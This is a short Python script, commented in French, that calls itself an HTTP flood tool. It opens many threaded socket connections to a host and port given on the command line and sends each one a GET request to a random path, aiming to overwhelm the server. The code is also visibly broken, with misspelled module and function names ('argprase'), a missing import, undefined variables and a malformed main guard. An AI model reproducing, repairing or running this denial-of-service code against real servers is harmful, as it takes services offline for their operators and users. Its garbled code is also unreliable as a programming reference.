"""
simple script de HTTP Flood 
"""
import socket # <-- Bibliothéque pour les fonctions HTTP
import threading # <-- Bibliothéque pour la partie distribuée
import argprase # <-- Pour l'input du programme 
import logging
import time
import random
# Variables Importantes 
host = ""
ip = ""
port = 0
number_requests = 0

def log():
    log = logging.getLogger('simple HTTP Flooder')
    log.setLevel(logging.INFO)
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    ch.setFormatter(formatter)
    log.addHandler(ch)
    return log
log = log()
log.info('Initilisation')


def prase_args():
    """
    Fonction pour l'input des options du script
    """
    praser = argprase.ArgumentPraser(description="Get flooder arguments")
    praser.add_argument("--host", dest="host",required=True)
    praser.add_argument("--port", dest="port",required=True)
    praser.add_argument("--attackNumber", dest="number",required=True)
    log.info("Arguments bien saises")
    return praser.parse_args()

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    log.info("Payload url generated")
    return data


def attaque():
    """
    Envoi des packets malicieux
    """
    url_path = generate_url_path()
    # Creation  d'un  socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Ouvir la connection dans ce raw socket
        dos.connect((ip, port))
        # envoi !! 
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
        byt = msg.encode()
        dos.send(byt)
    except socket.error:
        print ("\n [ No connection, server may be down ]: " + str(socket.error))
    finally:
        # fermeture du socket
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

def main():
    """
    Main script
    """
    thread_num = 0
    thread_num_mutex = threading.Lock()
    
    args = prase_args()
    host = args.host
    port = args.port
    number_requests = 1000
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=attaque)
        t1.start()
        all_threads.append(t1)

        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children thre

if name__=='__main__':
    main()

